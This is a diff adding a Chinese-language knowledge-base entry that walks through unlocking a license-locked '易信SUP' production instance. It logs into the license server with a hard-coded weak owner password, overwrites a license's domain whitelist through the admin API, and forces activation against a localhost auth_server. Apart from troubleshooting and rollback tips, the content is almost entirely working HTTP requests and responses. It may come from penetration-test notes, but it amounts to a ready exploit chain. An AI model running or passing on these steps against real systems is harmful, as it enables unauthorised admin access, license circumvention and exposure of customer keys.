@@ -1,0 +1,131 @@
+# 易信SUP：授权写面 + 可控 auth_server → 解除生产实例全站锁定
+
+配套条目：SSRF 与传参口径见 kb#559；:8090 owner 弱口令与授权码读写见 kb#568。
+本条只补它们之间的缺环：**license 的 domains 白名单**。
+
+## 0. 前置与状态记录（先存证）
+
+```
+POST /api/console/Activate/GetStatus HTTP/1.1
+Host: <T>:8080
+Content-Type: application/json
+
+{}
+```
+
+锁定态回显示例（据此拿 license_key，并留作解锁前后对照）：
+
+```json
+{"code":0,"data":{"activated":true,"locked":true,"status":2,
+ "fail_cnt":6720,"last_fail":"当前域名 pc.example.com 不在该授权的许可范围内",
+ "license_key":"YS-XXXX-XXXX-XXXX-XXXX"}}
+```
+
+同时确认业务面确实被闸死：
+
+```
+POST /api/console/Login/InitConfig   -> 403 "系统未授权"
+```
+
+> 单靠 SSRF（kb#559）走到这里是过不去的：签名能过，但 license 的 domains 不含当前访问域，
+> 接口恒定回 `code:1  当前域名 X 不在该授权的许可范围内`。要么「自助改绑」，要么自己去改。
+
+## 1. 拿授权服务器写面（弱口令，详见 kb#568）
+
+```
+POST /admin/login HTTP/1.1
+Host: <T>:8090
+Content-Type: application/json
+
+{"username":"admin","password":"yishou2026"}
+```
+
+```
+{"code":0,"data":{"role":"owner","role_name":"超级管理员",
+ "token":"<64hex>|<exp>|admin","username":"admin"},"message":"ok"}
+```
+
+判据：`code:0` **且** `data.role == "owner"`（普通 role 没有 licenses 写权限）。
+
+## 2. 取 license id 与现有 domains（必须先读再写）
+
+```
+GET /admin/licenses HTTP/1.1
+Host: <T>:8090
+Authorization: Bearer <TOKEN>
+```
+
+在 `data.list[]` 里按第 0 步的 license_key 定位 `id` 与原始 `domains`，
+把原值**整体保留**，只在末尾追加当前访问域。
+
+## 3. 追加白名单（唯一生效写法：单行逗号分隔）
+
+```
+POST /admin/licenses/update HTTP/1.1
+Host: <T>:8090
+Authorization: Bearer <TOKEN>
+Content-Type: application/json
+
+{"id":8,"domains":"www.example.com,pc.example.com"}
+```
+
+```
+{"code":0,"data":{"message":"已更新"},"message":"ok"}
+```
+
+否定对照（实测）：同一请求把 domains 写成换行分隔 `"www.example.com\npc.example.com"`
+→ 更新接口一样回成功，但下一步 GoSystem 仍回「不在许可范围」。
+**服务端按逗号 split，换行/空格会让整串变成一个域名。**
+
+## 4. 让实例自己向内置授权服务器验签
+
+1.0.43（旧实例）：只认 URL query。
+
+```
+POST /api/console/Activate/GoSystem?license_key=YS-XXXX-XXXX-XXXX-XXXX&auth_server=http://127.0.0.1:8090 HTTP/1.1
+Host: <T>:8080
+Content-Type: application/json
+```
+
+1.0.44：只认 JSON body，同样两个字段。
+
+```
+{"license_key":"YS-XXXX-XXXX-XXXX-XXXX","auth_server":"http://127.0.0.1:8090"}
+```
+
+成功回显：
+
+```json
+{"code":0,"data":{"activated":true,"expire_at":1821489306,"plan":"standard"},"message":"ok"}
+```
+
+## 5. 验收（三条都要）
+
+```
+POST /api/console/Activate/GetStatus   {} 
+-> {"code":0,"data":{"activated":true,"locked":false,"status":1,"fail_cnt":0,"last_fail":""}}
+
+POST /api/console/Login/InitConfig     -> 200（原 403），返回 version=1.0.43
+
+POST /api/customer/Login/GuestLogin {} -> 200，发 auth_token；随后 Order/Paging 200 出业务数据
+```
+
+`fail_cnt` 归零、`last_fail` 清空是验签真正通过、而非前端缓存/状态残留的硬证据。
+
+## 6. 常见失败原因
+
+| 现象 | 原因 / 处置 |
+|---|---|
+| 仍回「当前域名 X 不在许可范围」 | domains 用了换行或空格；改单行逗号；或 id 与 KEY 不匹配 |
+| 回「请输入授权码」 | 参数放进了 body，但该版本只读 query（1.0.43）；1.0.44 相反 |
+| 回「连接授权服务器失败，请检查网络后重试」 | 8090 与业务不在同一网络命名空间；试 host.docker.internal / 内网 IP，或改用 :8081 同族实例 |
+| `{"code":0}` 但业务仍 403 | 校验其他绑定（machine_code 等）；必要时 `POST /admin/licenses/create` 新建一把带当前域的 key 再激活 |
+| 401 / 返回 HTML 登录页 | 打了 8080 控制台而非 8090 授权服务器，或前置反代加了 Basic |
+| update 回 404 | 实现版本差异，找 `/admin/licenses/*` 的实际写路由（前端 bundle 里 grep `licenses/`） |
+
+## 7. 副作用与回滚
+
+- `domains` 是**覆盖写**，务必先 GET 再拼，别丢客户原有域名。
+- 激活改写了 `last_fail` / `fail_cnt` / `expire_at`；如需恢复原状，按第 2 步拿到的原值
+  再 update 一次，并让客户走正常激活流程重新验签。
+- `GET /admin/licenses` 里含客户机器码与全量 key，属敏感数据，出报告前脱敏。
